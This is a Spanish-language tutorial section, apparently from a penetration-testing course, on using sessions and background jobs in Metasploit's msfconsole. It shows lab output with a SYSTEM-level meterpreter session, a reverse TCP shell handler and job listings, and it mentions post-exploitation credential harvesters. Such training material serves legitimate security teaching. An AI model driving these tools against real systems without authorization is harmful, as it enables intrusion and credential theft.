MSFconsole puede gestionar múltiples módulos al mismo tiempo. Esta es una de las muchas razones por las cuales proporciona al usuario tanta flexibilidad. Esto se hace con el uso de `Sessions`, que crea interfaces de control dedicadas para todos tus módulos desplegados.

Una vez que se crean varias sesiones, podemos cambiar entre ellas y vincular un módulo diferente a una de las sesiones en segundo plano para ejecutarlo o convertirlas en trabajos. Ten en cuenta que una vez que una sesión se coloca en segundo plano, continuará ejecutándose y nuestra conexión con el host objetivo persistirá. Sin embargo, las sesiones pueden morir si algo sale mal durante la ejecución del payload, lo que provoca que el canal de comunicación se rompa.

---

## Using Sessions

Mientras ejecutamos cualquier exploit o módulo auxiliar disponible en msfconsole, podemos colocar la sesión en segundo plano siempre que formen un canal de comunicación con el host objetivo. Esto se puede hacer presionando la combinación de teclas `[CTRL] + [Z]` o escribiendo el comando `background` en el caso de las etapas de Meterpreter. Esto nos mostrará un mensaje de confirmación. Después de aceptar el mensaje, volveremos al prompt de msfconsole (`msf6 >`) y podremos lanzar inmediatamente un módulo diferente.

### Listing Active Sessions

Podemos usar el comando `sessions` para ver nuestras sesiones activas.

```r
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

### Interacting with a Session

Puedes usar el comando `sessions -i [no.]` para abrir una sesión específica.

```r
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

Esto es especialmente útil cuando queremos ejecutar un módulo adicional en un sistema ya explotado con un canal de comunicación formado y estable.

Esto se puede hacer colocando nuestra sesión actual en segundo plano, que se formó debido al éxito del primer exploit, buscando el segundo módulo que deseamos ejecutar y, si es posible, seleccionando el número de sesión en el cual se debe ejecutar el módulo. Esto se puede hacer desde el menú `show options` del segundo módulo.

Por lo general, estos módulos se pueden encontrar en la categoría `post`, refiriéndose a los módulos de Post-Exploitation. Los principales arquetipos de módulos en esta categoría consisten en recolectores de credenciales, sugeridores de exploits locales y escáneres de red internos.

---

## Jobs

Si, por ejemplo, estamos ejecutando un exploit activo en un puerto específico y necesitamos este puerto para un módulo diferente, no podemos simplemente terminar la sesión usando `[CTRL] + [C]`. Si hiciéramos eso, veríamos que el puerto seguiría en uso, afectando nuestro uso del nuevo módulo. Así que, en su lugar, necesitaríamos usar el comando `jobs` para ver las tareas activas en segundo plano y terminar las antiguas para liberar el puerto.

Otros tipos de tareas dentro de las sesiones también pueden convertirse en trabajos para ejecutarse en segundo plano sin problemas, incluso si la sesión muere o desaparece.

### Viewing the Jobs Command Help Menu

Podemos ver el menú de ayuda para este comando, como otros, escribiendo `jobs -h`.

```r
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

### Viewing the Exploit Command Help Menu

Cuando ejecutamos un exploit, podemos ejecutarlo como un trabajo escribiendo `exploit -j`. Según el menú de ayuda para el comando `exploit`, añadir `-j` a nuestro comando, en lugar de solo `exploit` o `run`, lo ejecutará en el contexto de un trabajo.

```r
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP
```

### Running an Exploit as a Background Job

```r

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

### Listing Running Jobs

Para listar todos los trabajos en ejecución, podemos usar el comando `jobs -l`. Para matar un trabajo específico, observa el número de índice del trabajo y usa el comando `kill [index no.]`. Usa el comando `jobs -K` para matar todos los trabajos en ejecución.

```r

msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

Next up, we'll work with the extremely powerful `Meterpreter` payload.